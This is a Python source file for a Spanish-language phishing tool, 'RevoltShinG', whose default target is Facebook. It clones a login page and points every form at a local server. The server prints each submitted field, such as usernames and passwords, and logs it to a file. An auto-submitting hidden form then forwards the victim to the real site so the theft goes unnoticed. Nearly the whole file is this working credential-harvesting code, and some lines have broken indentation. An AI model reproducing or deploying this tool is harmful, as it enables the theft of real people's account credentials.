
import urllib.request as ulib
from os import system
import socketserver
import os
import cgi
from bs4 import BeautifulSoup as bs
import http.server

def main():
	print ('''
\033[1;36m██████╗ ███████╗██╗   ██╗ ██████╗ ██╗  ████████╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
██╔══██╗██╔════╝██║   ██║██╔═══██╗██║  ╚══██╔══╝██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
██████╔╝█████╗  ██║   ██║██║   ██║██║     ██║   ███████╗███████║██║██╔██╗ ██║██║  ███╗
██╔══██╗██╔══╝  ╚██╗ ██╔╝██║   ██║██║     ██║   ╚════██║██╔══██║██║██║╚██╗██║██║   ██║
██║  ██║███████╗ ╚████╔╝ ╚██████╔╝███████╗██║   ███████║██║  ██║██║██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚══════╝  ╚═══╝   ╚═════╝ ╚══════╝╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝
                                                                              BY ANGEL
          ''')

                                                                                                                                            
	while True:
		help()
		try:
			
			comm=input("RevoltShinG>> ").split()
			
		
			if not comm:
				print(end='')

			elif comm[0]=="editar":
				if(comm[1]=="url"):
					global url
					url=comm[2]
					
			        if(comm[1]=="port"):
					global port
					port=comm[2]
					

				if(comm[1]=="url_destino"):
					global url_destino
					url_destino=comm[2]
					

				if(comm[1]=="user_agent"):
					global user_agent
					if(len(comm)==3):
						user_agent=comm[2]
					else:
						user_agent=""
					
		
			elif comm[0]=="iniciar":
				w=revoltshing( url, port)
				w.clonar()
				w.servidor()

			elif comm[0]=="exit":
				os.system("fuser -k -n tcp 80 ")
				exit()

			else:
				print()

		except KeyboardInterrupt:
			os.system("fuser -k -n tcp 80 ")
			w=revoltshing( url, port)
			w.eliminar()			
			print()

def help():
	
	print("\teditar      : Editar  [url,port,url_destino,user_agent]")
	print ("\tiniciar     : Iniciar Server")
	print("\texit        : Salir")
	print("\tport        :",port)
	print("\turl         :",url )
	print("\turl_destino :",url_destino)
	print("\tuser_agent  :",user_agent)
	print()
	
port=int(8080)
url="https://es-es.facebook.com"
url_destino="https://es-es.facebook.com"
user_agent="Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0"

class handler(http.server.SimpleHTTPRequestHandler):
	def do_POST(self):
		post_request = []
		print("\t"+self.address_string(),"sent POST req")
		form = cgi.FieldStorage(self.rfile,headers=self.headers,
		    environ={'REQUEST_METHOD':'POST',
			     'CONTENT_TYPE':self.headers['Content-Type'],})

		log=open(url.split("//")[1]+".log","a+")
		log.write(".......")
		log.write("Paquete "+url+"\n")

		for tag in form.list:
			tmp = str(tag).split("(")[1]
			key,value = tmp.replace(")", "").replace("\'", "").replace(",", "").split()
			post_request.append((key,value))
			print("\t"+key+" = "+value)
			log.write(key+"="+value+"\n")
		
		log.close();
		create_post(url,url_destino,post_request)
		http.server.SimpleHTTPRequestHandler.do_GET(self)
		

def create_post(url,url_destino,post_request):

	ref = open("ref.html","w")
	ref.write("<body><form id=\"ff\" action=\""+url_destino+"\" method=\"post\" >\n")
	
	for post in post_request:
		key,value = post
		ref.write("<input name=\""+key+"\" value=\""+value+"\" type=\"hidden\" >\n" )
	
	ref.write("<input name=\"login\" type=\"hidden\">")
	ref.write("<script langauge=\"javascript\">document.forms[\"ff\"].submit();</script>")
	ref.close()

class revoltshing:
	def __init__(self,url,port):
		self.port=port
		self.url=url
		self.httpd=None
		self.form_url=None

	def clonar(self):		
		data = ulib.urlopen(self.url).read()		
		data = bs(data,"html.parser")

		for tag in data.find_all("form"):
			tag["action"]="ref.html"
			tag["method"]="post"
		
		with open("index.html", "w") as index:
	    		index.write(data.prettify())
	    		index.close()

	def servidor(self):
		os.system("fuser -k -n tcp 80 ")
		print("\tServer Iniciado en http://localhost:"+str(self.port)+"\n")
		self.httpd = socketserver.TCPServer(("",self.port),handler)
		self.httpd.serve_forever()

	def eliminar(self):
		print()
		if os.path.exists("index.html"):
			os.remove("index.html")
		if os.path.exists("ref.html"):
			os.remove("ref.html")


if __name__=="__main__":
  main()
